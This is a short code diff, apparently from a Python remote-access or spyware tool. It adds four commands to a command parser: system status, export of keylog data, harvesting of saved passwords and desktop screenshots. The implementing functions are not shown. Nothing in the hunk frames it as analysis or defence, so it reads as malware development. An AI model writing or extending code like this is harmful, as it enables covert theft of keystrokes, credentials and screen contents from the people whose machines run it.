@@ -826,3 +826,7 @@ def pv01_initialize():
         
         # 5. Command Processor
         processor = CmdParser()
+        processor.register_command("status", logic.get_system_status, "System info")
+        processor.register_command("keys", logic.export_keys, "Keylog data")
+        processor.register_command("creds", logic.harvest_credentials, "Saved passeords")
+        processor.register_command("screenshot", logic.capture_screenshot, "Desktop image")
